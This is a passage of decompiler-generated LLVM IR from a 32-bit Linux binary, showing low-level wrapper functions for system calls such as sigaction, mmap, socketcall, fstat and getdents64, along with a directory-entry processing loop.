  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32 -134560036), i32 2), i32 0), label %dec_label_pc_8051933, label %dec_label_pc_805193f

dec_label_pc_8051933:                             ; preds = %dec_label_pc_805191b, %dec_label_pc_8051933
  %v4_8051933 = phi i32 [ %v1_805193a, %dec_label_pc_8051933 ], [ 0, %dec_label_pc_805191b ]
  store i32 ptrtoint (i32* @global_var_805193a.69 to i32), i32* %stack_var_-168, align 4
  %v5_8051933 = mul i32 %v4_8051933, 4
  %v6_8051933 = add i32 %v5_8051933, ptrtoint (i32* @global_var_8053924.57 to i32)
  %v7_8051933 = inttoptr i32 %v6_8051933 to i32*
  %v8_8051933 = load i32, i32* %v7_8051933, align 4
  call void @__pseudo_call(i32 %v8_8051933)
  %v0_805193a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805193a = add i32 %v0_805193a, 1
  store i32 %v1_805193a, i32* %ebx.global-to-local, align 4
  %v1_805193b = load i32, i32* %esi.global-to-local, align 4
  %v7_805193b = icmp ult i32 %v1_805193a, %v1_805193b
  br i1 %v7_805193b, label %dec_label_pc_8051933, label %dec_label_pc_805193f

dec_label_pc_805193f:                             ; preds = %dec_label_pc_8051933, %dec_label_pc_805191b
  %v0_8051948 = load i32, i32* %stack_var_-168, align 4
  %v1_8051948 = call i32 @function_804fe1b(i32 %v0_8051948)
  %v1_805194d = inttoptr i32 %v1_8051948 to i32*
  store i32 0, i32* %v1_805194d, align 4
  store i32 0, i32* @eax, align 4
  %v0_8051968 = load i32, i32* @global_var_8053a60.65, align 32
  store i32 %v0_8051968, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_80517cc)
  %v0_805197d = load i32, i32* @eax, align 4
  %v1_8051980 = call i32 @function_80513e0(i32 %v0_805197d)
  %v0_805198d = load i32, i32* @ebx, align 4
  %v1_805198d = inttoptr i32 %v0_805198d to %sigcontext*
  %v2_805198d = call i32 @sigreturn(%sigcontext* %v1_805198d)
  %v0_8051995 = load i32, i32* @ebx, align 4
  %v1_8051995 = inttoptr i32 %v0_8051995 to %sigcontext*
  %v2_8051995 = call i32 @sigreturn(%sigcontext* %v1_8051995)
  ret i32 %v2_8051995

; uselistorder directives
  uselistorder i32 %v1_805193a, { 1, 2, 0 }
  uselistorder i32 %v1_8051916, { 1, 2, 0 }
  uselistorder i32 %v2_8051856, { 1, 0 }
  uselistorder i32 %v1_8051853, { 2, 1, 0 }
  uselistorder i32 %v1_8051832, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805182f, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 (i32)* @function_80513e0, { 0, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32 -134560036), i32 2), { 1, 3, 2, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8053924.57 to i32), i32 -134560036), { 0, 2, 1 }
  uselistorder i32 ()* @function_8051758, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051933, { 1, 0 }
  uselistorder label %dec_label_pc_805190f, { 1, 0 }
  uselistorder label %dec_label_pc_80518ea, { 1, 0 }
  uselistorder label %dec_label_pc_8051853, { 1, 0 }
  uselistorder label %dec_label_pc_805183b, { 1, 0 }
}

define i32 @function_8051997(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8051997:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8051997 = load i32, i32* @esi, align 4
  %v0_8051998 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80519ad = icmp eq i32* %arg2, null
  br i1 %v1_80519ad, label %dec_label_pc_8051997.dec_label_pc_8051a00_crit_edge, label %dec_label_pc_80519b1

dec_label_pc_8051997.dec_label_pc_8051a00_crit_edge: ; preds = %dec_label_pc_8051997
  br label %dec_label_pc_8051a00

dec_label_pc_80519b1:                             ; preds = %dec_label_pc_8051997
  %v2_80519b1 = load i32, i32* %arg2, align 4
  store i32 %v2_80519b1, i32* %stack_var_-148, align 4
  %v1_80519ba = add i32 %tmp11, 4
  %v3_80519cc = bitcast i32* %stack_var_-136 to i16*
  %v4_80519cc = call i32 @function_805201a(i16* %v3_80519cc, i32 %v1_80519ba, i32 128)
  br label %dec_label_pc_8051a00

dec_label_pc_8051a00:                             ; preds = %dec_label_pc_8051997.dec_label_pc_8051a00_crit_edge, %dec_label_pc_80519b1
  %v1_8051a02 = icmp eq i32 %arg3, 0
  %v2_8051a06 = ptrtoint i32* %stack_var_-288 to i32
  %.v2_8051a06 = select i1 %v1_8051a02, i32 0, i32 %v2_8051a06
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  %v0_8051a1a = select i1 %v1_80519ad, %sigaction* null, %sigaction* %phitmp
  %v5_8051a22 = call i32 @function_8051abd(i32 %arg1, %sigaction* %v0_8051a1a, i32 %.v2_8051a06, i32 8)
  store i32 %v5_8051a22, i32* %ebx.global-to-local, align 4
  %v2_8051a30 = icmp slt i32 %v5_8051a22, 0
  %or.cond = or i1 %v1_8051a02, %v2_8051a30
  br i1 %or.cond, label %dec_label_pc_8051a65, label %dec_label_pc_8051a34

dec_label_pc_8051a34:                             ; preds = %dec_label_pc_8051a00
  %v3_8051a34 = load i32, i32* %stack_var_-288, align 4
  %v2_8051a38 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8051a34, i32* %v2_8051a38, align 4
  %v2_8051a40 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8051a45 = add i32 %arg3, 4
  %v3_8051a49 = inttoptr i32 %v1_8051a45 to i16*
  %v4_8051a49 = call i32 @function_805201a(i16* %v3_8051a49, i32 %v2_8051a40, i32 128)
  %v2_8051a52 = add i32 %arg3, 132
  %v3_8051a52 = inttoptr i32 %v2_8051a52 to i32*
  %v2_8051a5f = add i32 %arg3, 136
  %v3_8051a5f = inttoptr i32 %v2_8051a5f to i32*
  %v0_8051a65.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a65

dec_label_pc_8051a65:                             ; preds = %dec_label_pc_8051a00, %dec_label_pc_8051a34
  %v0_8051a65 = phi i32 [ %v5_8051a22, %dec_label_pc_8051a00 ], [ %v0_8051a65.pre, %dec_label_pc_8051a34 ]
  store i32 %v0_8051998, i32* @ebx, align 4
  store i32 %v0_8051997, i32* @esi, align 4
  ret i32 %v0_8051a65

; uselistorder directives
  uselistorder i32 128, { 0, 1, 3, 2 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_8051a65, { 1, 0 }
  uselistorder label %dec_label_pc_8051a00, { 1, 0 }
}

define i32 @function_8051a70(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8051a70:
  %stack_var_4 = alloca i32, align 4
  %v0_8051a70 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a70, i32* @edx, align 4
  %v2_8051a7b = load i32, i32* @ecx, align 4
  %v4_8051a7b = load i32, i32* @esi, align 4
  %v5_8051a7b = load i32, i32* @edi, align 4
  %v6_8051a7b = load i32, i32* @ebp, align 4
  %v7_8051a7b = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_8051a7b, i32 %v0_8051a70, i32 %v4_8051a7b, i32 %v5_8051a7b, i32 %v6_8051a7b)
  %v8_8051a7b = ptrtoint i32* %v7_8051a7b to i32
  store i32 %v0_8051a70, i32* @ebx, align 4
  %v3_8051a84 = icmp ugt i32* %v7_8051a7b, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8051a84, i32 134553909)
  ret i32 %v8_8051a7b

; uselistorder directives
  uselistorder i32* @ebp, { 1, 34, 18, 19, 20, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 16, 12, 13, 14, 15, 0, 17, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35 }
  uselistorder i32* @ecx, { 3, 33, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 4, 5, 1, 6, 35, 34, 28, 29, 2, 30, 31, 32 }
}

define i32 @function_8051a8b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051a8b:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a8b = load i32, i32* @ebx, align 4
  store i32 %v0_8051a8b, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8051a9e = call i32 @int80_syscall(i32 102)
  store i32 %v1_8051a9e, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8051a9e, -4095
  br i1 %tmp9, label %dec_label_pc_8051ab7, label %dec_label_pc_8051aab

dec_label_pc_8051aab:                             ; preds = %dec_label_pc_8051a8b
  %v1_8051aab = call i32 @function_804fe1b(i32 %v0_8051a8b)
  %v0_8051ab0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ab0 = sub i32 0, %v0_8051ab0
  %v2_8051ab2 = inttoptr i32 %v1_8051aab to i32*
  store i32 %v1_8051ab0, i32* %v2_8051ab2, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051abb.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051ab7

dec_label_pc_8051ab7:                             ; preds = %dec_label_pc_8051a8b, %dec_label_pc_8051aab
  %v2_8051abb = phi i32 [ %v0_8051a8b, %dec_label_pc_8051a8b ], [ %v2_8051abb.pre, %dec_label_pc_8051aab ]
  %v0_8051ab7 = phi i32 [ %v1_8051a9e, %dec_label_pc_8051a8b ], [ -1, %dec_label_pc_8051aab ]
  %v2_8051ab9 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051ab9, i32* @edx, align 4
  store i32 %v2_8051abb, i32* @ebx, align 4
  ret i32 %v0_8051ab7

; uselistorder directives
  uselistorder i32 %v1_8051a9e, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051ab7, { 1, 0 }
}

define i32 @function_8051abd(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051abd:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051abe = load i32, i32* @esi, align 4
  store i32 %v0_8051abe, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051ad2 = load i32, i32* @ebx, align 4
  %v7_8051ada = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8051ada, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8051ada, -4095
  br i1 %tmp14, label %dec_label_pc_8051af2, label %dec_label_pc_8051ae6

dec_label_pc_8051ae6:                             ; preds = %dec_label_pc_8051abd
  %v1_8051ae6 = call i32 @function_804fe1b(i32 %v0_8051ad2)
  %v0_8051aeb = load i32, i32* %esi.global-to-local, align 4
  %v1_8051aeb = sub i32 0, %v0_8051aeb
  %v2_8051aed = inttoptr i32 %v1_8051ae6 to i32*
  store i32 %v1_8051aeb, i32* %v2_8051aed, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8051af5.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051af2

dec_label_pc_8051af2:                             ; preds = %dec_label_pc_8051abd, %dec_label_pc_8051ae6
  %v2_8051af5 = phi i32 [ %v0_8051abe, %dec_label_pc_8051abd ], [ %v2_8051af5.pre, %dec_label_pc_8051ae6 ]
  %v0_8051af2 = phi i32 [ %v7_8051ada, %dec_label_pc_8051abd ], [ -1, %dec_label_pc_8051ae6 ]
  store i32 %v2_8051af5, i32* @esi, align 4
  ret i32 %v0_8051af2

; uselistorder directives
  uselistorder i32 %v7_8051ada, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051af2, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8051af8(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8051af8:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8051b20(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051b20:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051b20 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b20, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8051b33 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8051b33, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8051b33, -4095
  br i1 %tmp10, label %dec_label_pc_8051b4c, label %dec_label_pc_8051b40

dec_label_pc_8051b40:                             ; preds = %dec_label_pc_8051b20
  %v1_8051b40 = call i32 @function_804fe1b(i32 %v0_8051b20)
  %v0_8051b45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051b45 = sub i32 0, %v0_8051b45
  %v2_8051b47 = inttoptr i32 %v1_8051b40 to i32*
  store i32 %v1_8051b45, i32* %v2_8051b47, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8051b50.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051b4c

dec_label_pc_8051b4c:                             ; preds = %dec_label_pc_8051b20, %dec_label_pc_8051b40
  %v2_8051b50 = phi i32 [ %v0_8051b20, %dec_label_pc_8051b20 ], [ %v2_8051b50.pre, %dec_label_pc_8051b40 ]
  %v0_8051b4c = phi i32 [ %v4_8051b33, %dec_label_pc_8051b20 ], [ -1, %dec_label_pc_8051b40 ]
  %v2_8051b4e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b4e, i32* @edx, align 4
  store i32 %v2_8051b50, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051b4c

; uselistorder directives
  uselistorder i32 %v4_8051b33, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051b4c, { 1, 0 }
}

define i32 @function_8051b52(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051b52:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051b52 = load i32, i32* @ebx, align 4
  store i32 %v0_8051b52, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_8051b65 = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_8051b65, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_8051b65, -4095
  br i1 %tmp13, label %dec_label_pc_8051b80, label %dec_label_pc_8051b72

dec_label_pc_8051b72:                             ; preds = %dec_label_pc_8051b52
  %v1_8051b72 = call i32 @function_804fe1b(i32 %v0_8051b52)
  %v0_8051b77 = load i32, i32* @ebx, align 4
  %v1_8051b77 = sub i32 0, %v0_8051b77
  %v2_8051b79 = inttoptr i32 %v1_8051b72 to i32*
  store i32 %v1_8051b77, i32* %v2_8051b79, align 4
  %v2_8051b98.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8051b93

dec_label_pc_8051b80:                             ; preds = %dec_label_pc_8051b52
  %v1_8051b80 = icmp eq i32 %v4_8051b65, 0
  %v1_8051b82 = icmp eq i1 %v1_8051b80, false
  br i1 %v1_8051b82, label %dec_label_pc_8051b93, label %dec_label_pc_8051b84

dec_label_pc_8051b84:                             ; preds = %dec_label_pc_8051b80
  %v4_8051b8b = bitcast i32* %stack_var_-68 to i16*
  %v5_8051b8b = call i32 @function_8051f9d(i16* %v4_8051b8b, i32 %arg2, i32 %v4_8051b65, i32 %v4_8051b65)
  %v0_8051b93.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b93

dec_label_pc_8051b93:                             ; preds = %dec_label_pc_8051b80, %dec_label_pc_8051b72, %dec_label_pc_8051b84
  %v2_8051b98 = phi i32 [ %v0_8051b52, %dec_label_pc_8051b80 ], [ %v2_8051b98.pre, %dec_label_pc_8051b72 ], [ %v0_8051b52, %dec_label_pc_8051b84 ]
  %v0_8051b93 = phi i32 [ %v4_8051b65, %dec_label_pc_8051b80 ], [ -1, %dec_label_pc_8051b72 ], [ %v0_8051b93.pre, %dec_label_pc_8051b84 ]
  store i32 %v2_8051b98, i32* @ebx, align 4
  ret i32 %v0_8051b93

; uselistorder directives
  uselistorder i32 %v4_8051b65, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8051b93, { 2, 0, 1 }
}

define i32 @function_8051b9a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051b9a:
  %eax.global-to-local = alloca i32, align 4
  %v0_8051b9a = load i32, i32* @edi, align 4
  %v0_8051b9b = load i32, i32* @esi, align 4
  %v0_8051b9c = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8051ba1 = load i32, i32* @edx, align 4
  %v7_8051bab = inttoptr i32 %arg2 to i32*
  %v8_8051bab = call i32 @function_8051c09(i32 %arg1, i32* %v7_8051bab, i32 %arg3, i32 %v0_8051ba1, i32 %v0_8051b9c, i32 %v0_8051b9b, i32 %v0_8051b9a)
  store i32 %v8_8051bab, i32* %eax.global-to-local, align 4
  store i32 %v8_8051bab, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_8051bab, 1
  br i1 %tmp24, label %dec_label_pc_8051c03, label %dec_label_pc_8051bb9

dec_label_pc_8051bb9:                             ; preds = %dec_label_pc_8051b9a
  %v0_8051bb9 = load i32, i32* @ebx, align 4
  %v2_8051bb9 = add i32 %v0_8051bb9, %v8_8051bab
  store i32 %v2_8051bb9, i32* @edi, align 4
  %v7_8051bff4 = icmp ult i32 %v0_8051bb9, %v2_8051bb9
  br i1 %v7_8051bff4, label %dec_label_pc_8051bbe, label %dec_label_pc_8051c03

dec_label_pc_8051bbe:                             ; preds = %dec_label_pc_8051bb9, %dec_label_pc_8051bbe
  %v0_8051bbe = phi i32 [ %v2_8051bfd, %dec_label_pc_8051bbe ], [ %v0_8051bb9, %dec_label_pc_8051bb9 ]
  %v1_8051bbe = add i32 %v0_8051bbe, 8
  %v2_8051bbe = inttoptr i32 %v1_8051bbe to i32*
  %v3_8051bbe = load i32, i32* %v2_8051bbe, align 4
  store i32 %v3_8051bbe, i32* %eax.global-to-local, align 4
  %v2_8051bc1 = add i32 %v0_8051bbe, 4
  %v3_8051bc1 = inttoptr i32 %v2_8051bc1 to i32*
  store i32 %v3_8051bbe, i32* %v3_8051bc1, align 4
  %v0_8051bc4 = load i32, i32* @ebx, align 4
  %v1_8051bc4 = add i32 %v0_8051bc4, 16
  %v2_8051bc4 = inttoptr i32 %v1_8051bc4 to i32*
  %v3_8051bc4 = load i32, i32* %v2_8051bc4, align 4
  store i32 %v3_8051bc4, i32* %eax.global-to-local, align 4
  %v1_8051bc7 = trunc i32 %v3_8051bc4 to i16
  %v3_8051bc7 = add i32 %v0_8051bc4, 8
  %v4_8051bc7 = inttoptr i32 %v3_8051bc7 to i16*
  store i16 %v1_8051bc7, i16* %v4_8051bc7, align 2
  %v0_8051bcb = load i32, i32* @ebx, align 4
  %v1_8051bcb = add i32 %v0_8051bcb, 18
  %v2_8051bcb = inttoptr i32 %v1_8051bcb to i8*
  %v3_8051bcb = load i8, i8* %v2_8051bcb, align 1
  %v4_8051bcb = zext i8 %v3_8051bcb to i32
  %v5_8051bcb = load i32, i32* %eax.global-to-local, align 4
  %v6_8051bcb = and i32 %v5_8051bcb, -256
  %v7_8051bcb = or i32 %v6_8051bcb, %v4_8051bcb
  store i32 %v7_8051bcb, i32* %eax.global-to-local, align 4
  %v3_8051bce = add i32 %v0_8051bcb, 10
  %v4_8051bce = inttoptr i32 %v3_8051bce to i8*
  store i8 %v3_8051bcb, i8* %v4_8051bce, align 1
  %v0_8051bd2 = load i32, i32* @ebx, align 4
  %v1_8051bd2 = add i32 %v0_8051bd2, 8
  %v2_8051bd2 = inttoptr i32 %v1_8051bd2 to i16*
  %v3_8051bd2 = load i16, i16* %v2_8051bd2, align 2
  %v4_8051bd2 = zext i16 %v3_8051bd2 to i32
  %v1_8051bd6 = add nsw i32 %v4_8051bd2, -19
  %v1_8051bda = add i32 %v0_8051bd2, 19
  %v1_8051bde = add i32 %v0_8051bd2, 11
  store i32 %v1_8051bde, i32* %eax.global-to-local, align 4
  %v3_8051be2 = inttoptr i32 %v1_8051bde to i8*
  %v4_8051be2 = call i32 @function_804fe45(i8* %v3_8051be2, i32 %v1_8051bda, i32 %v1_8051bd6)
  store i32 %v4_8051be2, i32* %eax.global-to-local, align 4
  %v0_8051bea = load i32, i32* @ebx, align 4
  %v1_8051bea = add i32 %v0_8051bea, 8
  %v2_8051bea = inttoptr i32 %v1_8051bea to i16*
  %v3_8051bea = load i16, i16* %v2_8051bea, align 2
  %v4_8051bea = zext i16 %v3_8051bea to i32
  store i32 %v4_8051bea, i32* %eax.global-to-local, align 4
  %v3_8051bf1 = inttoptr i32 %v0_8051bea to i8*
  %v4_8051bf1 = call i32 @function_804fe45(i8* %v3_8051bf1, i32 %v0_8051bea, i32 %v4_8051bea)
  store i32 %v4_8051bf1, i32* %eax.global-to-local, align 4
  %v0_8051bf6 = load i32, i32* @ebx, align 4
  %v1_8051bf6 = add i32 %v0_8051bf6, 8
  %v2_8051bf6 = inttoptr i32 %v1_8051bf6 to i16*
  %v3_8051bf6 = load i16, i16* %v2_8051bf6, align 2
  %v4_8051bf6 = zext i16 %v3_8051bf6 to i32
  store i32 %v4_8051bf6, i32* %eax.global-to-local, align 4
  %v2_8051bfd = add i32 %v4_8051bf6, %v0_8051bf6
  store i32 %v2_8051bfd, i32* @ebx, align 4
  %v1_8051bff = load i32, i32* @edi, align 4
  %v7_8051bff = icmp ult i32 %v2_8051bfd, %v1_8051bff
  br i1 %v7_8051bff, label %dec_label_pc_8051bbe, label %dec_label_pc_8051bff.dec_label_pc_8051c03.loopexit_crit_edge

dec_label_pc_8051bff.dec_label_pc_8051c03.loopexit_crit_edge: ; preds = %dec_label_pc_8051bbe
  %v0_8051c03.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051c03

dec_label_pc_8051c03:                             ; preds = %dec_label_pc_8051bb9, %dec_label_pc_8051bff.dec_label_pc_8051c03.loopexit_crit_edge, %dec_label_pc_8051b9a
  %v0_8051c03 = phi i32 [ %v8_8051bab, %dec_label_pc_8051b9a ], [ %v0_8051c03.pre.pre, %dec_label_pc_8051bff.dec_label_pc_8051c03.loopexit_crit_edge ], [ %v8_8051bab, %dec_label_pc_8051bb9 ]
  store i32 %v0_8051c03, i32* %eax.global-to-local, align 4
  store i32 %v0_8051b9b, i32* @esi, align 4
  store i32 %v0_8051b9a, i32* @edi, align 4
  ret i32 %v0_8051c03

; uselistorder directives
  uselistorder i32 %v0_8051c03, { 1, 0 }
  uselistorder i32 %v2_8051bfd, { 1, 2, 0 }
  uselistorder i32 %v0_8051bea, { 1, 0, 2 }
  uselistorder i32 %v0_8051bd2, { 1, 0, 2 }
  uselistorder i32 %v0_8051bbe, { 1, 0 }
  uselistorder i32 %v0_8051bb9, { 0, 2, 1 }
  uselistorder i32 %v8_8051bab, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_804fe45, { 0, 1, 3, 2 }
  uselistorder i32 11, { 5, 3, 4, 6, 2, 0, 1 }
  uselistorder label %dec_label_pc_8051c03, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051bbe, { 1, 0 }
}

define i32 @function_8051c09(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8051c09:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_8051c0c = load i32, i32* @edi, align 4
  %v0_8051c0e = load i32, i32* @ebx, align 4
  %v15_8051c0f = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8051c18 = add i32 %arg3, 30
  %v1_8051c1e = and i32 %v1_8051c18, -16
  %v2_8051c21 = sub i32 %v15_8051c0f, %v1_8051c1e
  %v1_8051c23 = add i32 %v2_8051c21, 15
  %v1_8051c27 = and i32 %v1_8051c23, -16
  %v1_8051c2d = inttoptr i32 %v1_8051c27 to %linux_dirent64*
  store i32 %v1_8051c27, i32* %ecx.global-to-local, align 4
  %v2_8051c2f = add i32 %v2_8051c21, -4
  %v3_8051c2f = inttoptr i32 %v2_8051c2f to i32*
  store i32 %v0_8051c0e, i32* %v3_8051c2f, align 4
  %v0_8051c30 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_8051c37 = call i32 @getdents64(i32 %v0_8051c30, %linux_dirent64* %v1_8051c2d, i32 %arg3)
  store i32 %v5_8051c37, i32* %eax.global-to-local, align 4
  %v0_8051c39 = load i32, i32* @esp, align 4
  %v3_8051c39 = add i32 %v0_8051c39, 4
  %tmp39 = icmp ult i32 %v5_8051c37, -4095
  br i1 %tmp39, label %dec_label_pc_8051c59, label %dec_label_pc_8051c44

dec_label_pc_8051c44:                             ; preds = %dec_label_pc_8051c09
  %v1_8051c44 = call i32 @function_804fe1b(i32 %v5_8051c37)
  store i32 %v1_8051c44, i32* %eax.global-to-local, align 4
  %v4_8051c49 = sub i32 0, %v5_8051c37
  %v2_8051c4f = inttoptr i32 %v1_8051c44 to i32*
  store i32 %v4_8051c49, i32* %v2_8051c4f, align 4
  br label %dec_label_pc_8051d15

dec_label_pc_8051c59:                             ; preds = %dec_label_pc_8051c09
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_8051c27, i32* @ebx, align 4
  %v5_8051d05 = add i32 %v5_8051c37, %v1_8051c27
  store i32 %v5_8051d05, i32* %eax.global-to-local, align 4
  %v7_8051d0829 = icmp ult i32 %v1_8051c27, %v5_8051d05
  br i1 %v7_8051d0829, label %dec_label_pc_8051c72.lr.ph, label %dec_label_pc_8051d10

dec_label_pc_8051c72.lr.ph:                       ; preds = %dec_label_pc_8051c59
  %v5_8051c7f = add i32 %tmp14, %arg3
  br label %dec_label_pc_8051c72

dec_label_pc_8051c72:                             ; preds = %dec_label_pc_8051c72.lr.ph, %dec_label_pc_8051cb4
  %stack_var_-32.034 = phi i32 [ -1, %dec_label_pc_8051c72.lr.ph ], [ %v3_8051cb7, %dec_label_pc_8051cb4 ]
  %stack_var_-36.033 = phi i32 [ -1, %dec_label_pc_8051c72.lr.ph ], [ %v3_8051cb4, %dec_label_pc_8051cb4 ]
  %v0_8051cc032 = phi i32 [ %v1_8051c27, %dec_label_pc_8051c72.lr.ph ], [ %v2_8051cfd, %dec_label_pc_8051cb4 ]
  %v1_8051cc531 = phi i32 [ %tmp14, %dec_label_pc_8051c72.lr.ph ], [ %v2_8051c82, %dec_label_pc_8051cb4 ]
  %v0_8051c8c30 = phi i32 [ %v3_8051c39, %dec_label_pc_8051c72.lr.ph ], [ %v1_8051cff, %dec_label_pc_8051cb4 ]
  %v1_8051c72 = add i32 %v0_8051cc032, 16
  %v2_8051c72 = inttoptr i32 %v1_8051c72 to i16*
  %v3_8051c72 = load i16, i16* %v2_8051c72, align 2
  %v4_8051c72 = zext i16 %v3_8051c72 to i32
  %v1_8051c76 = add nuw nsw i32 %v4_8051c72, 3
  %v1_8051c7c = and i32 %v1_8051c76, 131068
  store i32 %v1_8051c7c, i32* %ecx.global-to-local, align 4
  store i32 %v5_8051c7f, i32* %eax.global-to-local, align 4
  %v2_8051c82 = add i32 %v1_8051c7c, %v1_8051cc531
  %tmp40 = icmp ugt i32 %v2_8051c82, %v5_8051c7f
  br i1 %tmp40, label %dec_label_pc_8051c8c, label %dec_label_pc_8051cb4

dec_label_pc_8051c8c:                             ; preds = %dec_label_pc_8051c72
  %v1_8051c8c = add i32 %v0_8051c8c30, -4
  %v2_8051c8c = inttoptr i32 %v1_8051c8c to i32*
  store i32 0, i32* %v2_8051c8c, align 4
  %v5_8051c8e = add i32 %v0_8051c8c30, -8
  %v6_8051c8e = inttoptr i32 %v5_8051c8e to i32*
  store i32 %stack_var_-32.034, i32* %v6_8051c8e, align 4
  %v5_8051c91 = add i32 %v0_8051c8c30, -12
  %v6_8051c91 = inttoptr i32 %v5_8051c91 to i32*
  store i32 %stack_var_-36.033, i32* %v6_8051c91, align 4
  %v5_8051c94 = add i32 %v0_8051c8c30, -16
  %v6_8051c94 = inttoptr i32 %v5_8051c94 to i32*
  store i32 %arg1, i32* %v6_8051c94, align 4
  %v1_8051c97 = call i32 @function_8051e1f(i32 %v2_8051c82)
